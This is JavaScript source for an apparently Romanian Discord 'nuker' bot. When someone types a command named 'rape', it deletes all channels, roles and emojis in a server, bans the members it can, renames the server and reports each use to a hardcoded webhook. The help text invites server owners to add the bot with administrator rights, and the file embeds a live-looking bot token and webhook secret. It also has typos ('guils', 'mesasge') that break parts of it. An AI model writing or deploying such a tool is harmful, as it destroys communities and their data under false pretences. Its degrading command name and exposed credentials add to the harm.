const { Client } = require("discord.js");
const Discord = require("discord.js");
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({
});
require('discord-reply')
const db = require("quick.db")
const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)

client.on("ready", async () => {
  
const statusArray = ['Better leave me alone', 'I will make you die with 1 button', 'i make your server disappear', `${client.guils.cache.size - 1} victims`];
client.user.setPresence({ status: 'dnd' });
    setInterval(() => {
      client.user.setPresence({ status: 'dnd' });
      const random = statusArray[Math.floor(Math.random() * statusArray.length)].split(', ')
      const status = random[0];
      const mode = random[1];
      client.user.setActivity(status, { type: mode })
    }, 10000) 
  console.log(`${client.name} is on`);
}); 
  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })

client.on(`message`, message => {
  if (message.content === `ping`|| message.content === `Ping` || message.content === `PING`) {
    const pingembed = new Discord.MessageEmbed()
    .setColor('GREEN')
    .setDescription(`>>> <:sageata1:943563139042148494> Ping latency <a:sageatagif:943563792065888296> \`${Date.now() - message.createdTimestamp}ms\`\n<:sageata2:943563204490051584>
 <a:sageatagif:943563792065888296> \`${Math.round(message.client.ws.ping)}ms\``)
    message.lineReplyNoMention(pingembed)
  }
});
client.on("message", async(message)=>{
  if (!message.guild) return;
      if (!message.guild) return;
    if (message.content.startsWith('rape')||message.content.startsWith(`Rape`)||message.content.startsWith(`RAPE`)) {
const whitelisted = new Discord.MessageEmbed()
      .setDescription(`<a:x_:943565983925301328> You don't have permission to use this command on this server!`)
      .setColor(`RED`)
         if(message.guild.id == '942067056898089060') return message.lineReplyNoMention(whitelisted)
       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id
      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")
let mes = new Discord.MessageEmbed()
.setColor("#2f3136")
.setDescription (`\`\`\`\nMafia Albaneza\n\`\`\`\n**${mesasge.author.tag} (\`${message.author.id}\`) a folosit comanda **rape** pe serverul **${message.guild.name} (\`${message.guild.id}\`)`)
.setTimestamp(Date.now());
    const wrb = new Discord.WebhookClient("942070675441594428","M4ZP0cePda0bvFZvuCY1rWKJG963DUdk8r4xBeMEivT4N20gJaBI2rY0zq0XrRGlhDY9");
    await wrb.send(mes)
message.delete()
       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });
message.guild.members.cache.filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach( member => {
   member.ban()
     
})
message.guild.setName("server inchis")
    message.guild.setIcon(
      "https://playtech.ro/stiri/wp-content/uploads/2020/08/tzanca-uraganu-1280x720.jpg"
    );  
} 
        if (message.content.startsWith(`help`)|| message.content.startsWith(`HELP`)||message.content.startsWith(`Help`) || message.content.startsWith('invite') || message.content.startsWith('Invite') || message.content.startsWith('INVITE')) {
            const helpEmbed = new Discord.MessageEmbed()  
                .setTitle('<a:kill:943563293350576148>・**__HELP COMMANDS__**')
                .setDescription(`>>> <:sageata1:943563139042148494> \`rape\` <a:sageatagif:943563792065888296> **__Destroys server__**
<:emoji:946474409978363914> \`ping\` <a:sageatagif:943563792065888296> **__Shows bot's connection__**
<:sageata2:943563204490051584> \`invite\` <a:sageatagif:943563792065888296> **__Invite bot__**

[Invite](https://discord.com/oauth2/authorize?client_id=943201575697010779&permissions=8&scope=bot) | [Server](https://discord.gg/4Ty4TzVRSS)`)
              .setThumbnail(`https://images-ext-1.discordapp.net/external/wkfyPoR-ICwu9NvZlpqeeL35ch79r3oDC1sJmhO3Z0U/https/media.discordapp.net/attachments/869954400142098482/946227602564214794/451309D1-B014-4B1A-8FA7-4CB057CD1E68.gif`)
                .setFooter(`requested by ${message.author.username}`, mesasge.author.displayAvatarURL({
dynamic: true}))
                .setColor(`2f3136`)
                .setTimestamp(Date.now());
            message.lineReplyNoMention(helpEmbed);
        }
  if (message.content === "leaveall") {
  let ownerID = "941961664629194812"
           let owner2 = "371224177186963460"
           if(message.author.id !== ownerID && message.author.id !== owner2) return
             client.guilds.cache.forEach(guild => {
               let whitelist = "942067056898089060"
               if(whitelist.includes(guild.id)) return;
               guild.leave()
             })
           message.channel.send(`👍 Albaneza left all guilds!`)
}
});
client.login("OTIzMzYyODYwMDU3MzkxMTU3.YcO6rQ.1gL09kQultfBpVGGo91Xy_ix6a0")